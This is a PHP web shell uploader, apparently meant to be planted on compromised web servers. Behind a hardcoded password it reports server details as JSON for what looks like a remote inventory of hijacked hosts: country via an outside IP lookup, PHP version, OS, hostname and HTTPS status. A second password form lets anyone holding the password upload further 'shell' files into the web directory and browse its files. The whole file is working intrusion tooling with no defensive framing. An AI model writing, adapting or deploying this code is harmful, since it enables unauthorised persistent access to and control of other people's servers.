<?php
	$password = "1877"; //min 4
	$error = ""; 
	if(isset($_POST["passwordapi"]) && $_POST["passwordapi"] == $password && isset($_POST["id"]) && $_POST["id"] == "server"){
				
				$reponse = array();
				
				$reponse['ok'] = "1";
				
				if($reponse['ok'] == "1"){
      				if($_SERVER['HTTPS'] == "on" && $_SERVER['SERVER_PORT'] == "443"){
    					$reponse['https'] = "1";
    				}
    				else {
    					$reponse['https'] = "0";
    				}
    				
    				$serverip = $_SERVER['SERVER_ADDR'];
    				function &Get_Server_Contry ($ip)
    				{
    					//$string = preg_replace('/\s+/', '', $ip);
    					$url = "http://api.hostip.info/get_json.php?ip=".$ip;
    					$headers = array();
    					$headers[] = 'Accept-Version: 3';
    					$ch = curl_init();  
    					curl_setopt($ch,CURLOPT_URL,$url);
    					curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    					curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    					$resp=curl_exec($ch);
    					curl_close($ch);
    					$Json = json_decode($resp, true);
    			
    					$Contry = "";
    			
    					
    					$Contry =&  $Json['country_name'];
    			
    					
    					//$array = array($IPContry) ;
    					return $Contry ;	
    				}
    				
    				$ServerContryIs =  Get_Server_Contry ($serverip);
    				
    				if(!empty($ServerContryIs)){
    					$reponse['country'] = $ServerContryIs;
    				}
    				else {
    					$reponse['country'] = 0;
    				}
    				$phpversion = phpversion();
    				if(!empty($phpversion)){
    					$reponse['phpversion'] = $phpversion;
    				}
    				else {
    					$reponse['phpversion'] = "0";
    				}
    				
    				$serverOs = PHP_OS;
    				
    				if(!empty($serverOs)){
    					$reponse['serveros'] = $serverOs;
    				}
    				else {
    					$reponse['serveros'] = "0";
    				}
    				
    				
    				
    				$machinetype = php_uname('m');
    				if(!empty($machinetype)){
    					$reponse['machinetype'] = $machinetype;
    				}
    				else {
    					$reponse['machinetype'] = "0";
    				}

    				$hostname = gethostname();
    				if(!empty($hostname)){
    					$reponse['hostname'] = $hostname;
    				}
    				else {
    					$reponse['hostname'] = "0";
    				}
    				
    				$url =  'http://' . $_SERVER['SERVER_NAME']; 
    				$tld = end(explode(".", parse_url($url, PHP_URL_HOST))); 
    				if(!empty($tld)){
    					$reponse['tld'] = $tld;
    				}
    				else {
    					$reponse['tld'] = "0";
    				}  
				    
				}
				else {
				    $reponse['ok'] = "0";
				}
				echo json_encode($reponse);	
				exit();	

	 }
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
				<!-- Vendor styles -->
		<link rel="stylesheet" href="http://localhost/faker/_template/vendors/bower_components/material-design-iconic-font/dist/css/material-design-iconic-font.min.css">

		<!-- App styles -->
		<link rel="stylesheet" href="http://localhost/faker/_template/css/app.min.css">
		<style type="text/css">
			.files {
				overflow-y: scroll;
				max-height: 500px;
				height: 500px;
				border: 1px solid #666;
			}
		</style>
	</head>

	<body data-sa-theme="1">
		<section class="error">
			<div class="error__inner">
							
	
	<?php
	
	if(isset($_POST["password"]) && $_POST["password"] == $password){
		

		if(isset($_POST["ok"])){

			if(isset($_FILES["shell"])){

				if($_FILES["shell"]['error'] == 0){

					//print_r($_FILES);
					if(move_uploaded_file($_FILES["shell"]['tmp_name'], './'.$_FILES["shell"]['name'])){
						$error = '<h4>Shell Uploaded</h4>';	
					}
					else {
						$error = '<h4>ERROR Shell Not Uploaded</h4>';
					}

				}
				else {
					$error = '<h4>ERROR File !</h4>';
				}

			}
			else {
				$error = '<h4>ERROR Please choose a file</h4>';
			}
						
		}
		
		
	?>
		<h4>Upload a shell</h4>
		<?php echo $error ?>
		<form action="" method="POST" enctype="multipart/form-data"> 
			<input type="file" name="shell" class="form-control"><br/><br/>
			<input type="submit" name="ok" class="btn btn-light">
			<input type="hidden" name="password" value="<?php echo $_POST['password']; ?>">
 		</form>
    <?php
        if ($handle = opendir('.')) {
        	echo '<div class="files">';
            while (false !== ($entry = readdir($handle))) {

                if ($entry != "." && $entry != "..") {

                    echo '<a href="'.$entry.'">'.$entry.'</a><br/>';
                }
            }
            echo '</div>';
            closedir($handle);
        }
    ?>
        <a href="../">../</a><br/>
        <a href="./">./</a>
	<?php


	
	
	
	}
	else {
	?>
		<h4>Password</h4>
		<form method="post" action="">
			<input name="password" type="text" class="form-control text-center"><br/><br/>
			<input type="submit" name="go" class="btn btn-light">
		</form>
						
	<?php
	}
?>
					</div>
				</section>
		
			</body>
		</html>
